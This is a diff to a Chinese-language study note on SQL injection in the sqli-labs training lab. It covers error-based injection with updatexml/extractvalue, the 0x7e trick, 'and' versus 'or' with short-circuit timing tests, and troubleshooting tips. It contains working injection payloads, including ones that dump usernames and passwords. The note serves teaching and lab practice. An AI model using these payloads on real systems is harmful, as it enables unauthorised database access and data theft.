@@ -87,6 +87,12 @@ $row = mysql_fetch_array($result);               -- PHP 层只取 1 行
 | `updatexml(1,x,1)` | 报错注入，回显 `x` | 同上 |
 
 > ⚠️ `extractvalue` / `updatexml` 报错回显**最多 32 字节**，超出的部分会被截断。要拿完整数据得配合 `substr()` 分段取。
+>
+> ⚠️ **为什么一定要加 `0x7e`？** 两个原因：
+> 1. 第二个参数（XPath）**必须是常量**，传列名会被拒：`Only constant XPATH queries are supported`
+> 2. 它必须是一个**非法**的 XPath 才会报错。`concat(database())` 的结果是 `security`，
+>    而 `security` 恰好是个**合法**的元素名 → 不报错、页面一片空白。
+>    加上 `0x7e`（`~`）变成 `~security`，`~` 不是合法 XPath 字符 → 报错，数据就跟着吐出来了。
 
 ### 6. 判断页面「成功/失败」的信号
 
@@ -873,16 +879,35 @@ passwd = ' or updatexml(1,concat(0x7e,(select * from (select group_concat(userna
 
 > 💡 这个派生表绕过的技巧很实用，遇到 `ERROR 1093` 就用它。
 
-**④ 为什么用 `or` 而不是 `and`？**
+**④ `and` 还是 `or`？—— 实测两个都能用**
 
-`$passwd` 被包在 `SET password = '...'` 里，输入 `' or updatexml(...) or '` 得到：
-```sql
-SET password = '' or updatexml(...) or ''
+| payload | 实测结果 |
+|---|---|
+| `' or updatexml(1,concat(0x7e,database()),1) or '` | `XPATH syntax error: '~security'` ✓ |
+| `' and updatexml(1,concat(0x7e,database()),1) and '` | `XPATH syntax error: '~security'` ✓ |
+
+两个都成功。原因是 **`updatexml()` 的 XPath 参数必须是常量**，传列名进去会被 MySQL 直接拒绝：
+
 ```
-`''` 在布尔上下文里是**假**，所以 `or` 右边**必须求值** → `updatexml` 被执行 → 报错成功。
+?id=1' and updatexml(1,concat(0x7e,username),1)--+
+→ Only constant XPATH queries are supported
+```
 
-如果写 `and`，`'' and updatexml(...)` 因为左边已经是假，MySQL 短路求值，**updatexml 根本不会执行**。
-> 这是报错注入里非常容易踩的坑：**闭合后左边是假值，就用 `or`；左边是真值，才用 `and`。**
+既然是常量，MySQL 在**优化阶段就把它算掉了**，而优化发生在 WHERE 求值**之前**。
+所以 `and` 左边是真是假，都不影响报错触发。
+
+> ⚠️ 但**别以为 `and` 永远安全** —— 短路求值本身是真实存在的，只是管不到常量表达式：
+
+| 测试 | 耗时 | 说明 |
+|---|---|---|
+| `?id=1' and sleep(3)--+` | 3.24s | 左边为真 → 右边执行 |
+| `?id=-1' and sleep(3)--+` | 0.22s | 左边为假 → **右边被短路，根本没执行** |
+
+`sleep()` 不是常量、折叠不掉，所以老老实实遵守短路规则。
+
+**真正的规则**：
+- 报错函数里放**常量**（`database()` / `version()` / 子查询）→ 优化期就被折叠，`and`、`or` 都行
+- 放**折叠不掉**的东西（`sleep()`、依赖行的表达式）→ 左边为假时 `and` 会失效，这时必须用 `or`
 
 ---
 
@@ -1103,7 +1128,11 @@ Cookie: uname=' or updatexml(1,concat(0x7e,database()),1) or '
 | 所有 payload 都返回一样的 `Dumb/Dumb` | `magic_quotes_gpc = On` 把 `'` 转义了 | 改 `php5.2.17nts\php.ini` 为 `Off` 并重启服务 |
 | Less-7 写文件失败 | `@@secure_file_priv = NULL` | 改 `my.ini` 后重启 MySQL（或改用盲注） |
 | Less-17 拖库失败 | MySQL `ERROR 1093`：UPDATE 时子查询同表 | 套派生表 `(select * from (...) x)` |
-| Less-17 用 `and` 不出报错 | `'' and X` 短路求值 | 改用 `or` |
+| `and` 左边为假时 `sleep()` 不执行 | `AND` 短路求值（**常量表达式不受影响**，会在优化期被折叠） | 改用 `or`，或让左边为真 |
+| `FUNCTION security.concatenate does not exist` | MySQL **根本没有** `concatenate()` 这个函数，纯属拼错 | 改成 `concat()` |
+| `FUNCTION 库名.函数名 does not exist` | MySQL 把不认识的函数名当成**用户自定义函数 (UDF)**，而 UDF 必须带库名前缀——报错里的 `security` 就是这么来的 | 回头检查函数名拼写 |
+| `Only constant XPATH queries are supported` | `updatexml()` / `extractvalue()` 的 XPath 参数**必须是常量**，传列名会被拒 | 用 `database()`、`version()` 或子查询 |
+| updatexml 不报错、页面一片空白 | XPath 参数恰好是**合法**路径：`concat(database())` = `security` 是合法的元素名 | 加 `0x7e` 前缀，把 `~security` 变成非法 XPath |
 | updatexml 只吐一半数据 | 报错回显上限 32 字节 | 用 `substr()` 分段取 |
 | Less-13/14 的 UNION 看不到数据 | 源码里 echo 被注释掉了 | 改走布尔盲注，看 `flag.jpg` |
 | 改完 Cookie 刷新又变回去了 | 点了提交按钮走了 POST 分支 | 只按 F5 刷新 |
